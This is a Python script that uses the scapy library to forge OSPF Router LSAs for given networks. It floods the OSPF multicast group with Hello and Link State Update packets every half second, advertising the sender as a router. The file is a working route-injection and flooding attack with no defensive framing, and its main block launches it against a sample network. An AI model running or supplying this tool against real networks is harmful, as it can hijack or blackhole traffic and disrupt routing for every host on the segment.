"""
Documentation for scapy OSPF:
https://scapy.readthedocs.io/en/latest/api/scapy.contrib.ospf.html
"""

from time import sleep
from scapy.contrib.ospf import *
from scapy.all import *
from netaddr import IPNetwork

# Only transit should be used in this tool. This dictionary just gives the numbers meaning
OSPF_Router_LSA_types = {
  "p2p": 1,
  "transit": 2,
  "stub": 3,
  "virtual": 4
}

MY_IP = IP().src
ADVERTISE_IP = '224.0.0.5'

# FOR TESTING
TEST_NETWORKS = [
  '192.168.1.0/24'
]


def generate_lsa_list(networks: List[str], src_ip=MY_IP, metric=1):
  """
  Given a list of networks specified in CIDR notation, generate OSPF_Router_LSA packets.

  Parameters
  -----------
  networks: List[str]
      List of network addresses in CIDR notation
  """
  lsalist = []
  for network in networks:
    ip = IPNetwork(network)
    ip_addr = ip.ip
    ip_netmask = ip.netmask
    lsalist.append(
      OSPF_Router_LSA(id=src_ip, adrouter=src_ip, linklist=[
        OSPF_Link(id=ip_addr, data=ip_netmask,
                  metric=metric,
                  type=OSPF_Router_LSA_types['transit'])
      ])
    )

  return lsalist


def spam_hello_and_advertisements(*, networks: List[str], interval=0.5):
  """
  Given a list of network addresses specified in CIDR notation,
  flood those networks with OSPF Hello packets and LSA updates.

  Parameters
  -----------
  networks: List[str]
      List of network addresses in CIDR notation

  interval: number
      Interval in seconds to spam packets
  """

  lsalist = generate_lsa_list(networks)

  print('Spamming hello and LSUpdate packets.')
  while True:
    hello_packet = IP(dst=ADVERTISE_IP) / \
      OSPF_Hdr(src=MY_IP) / OSPF_Hello()
    send(hello_packet, verbose=False)

    update_packet = IP(dst=ADVERTISE_IP) / \
        OSPF_Hdr(src=MY_IP) / OSPF_LSUpd(lsalist=lsalist)
    send(update_packet, verbose=False)

    sleep(interval)


if __name__ == '__main__':
  spam_hello_and_advertisements(networks=TEST_NETWORKS)
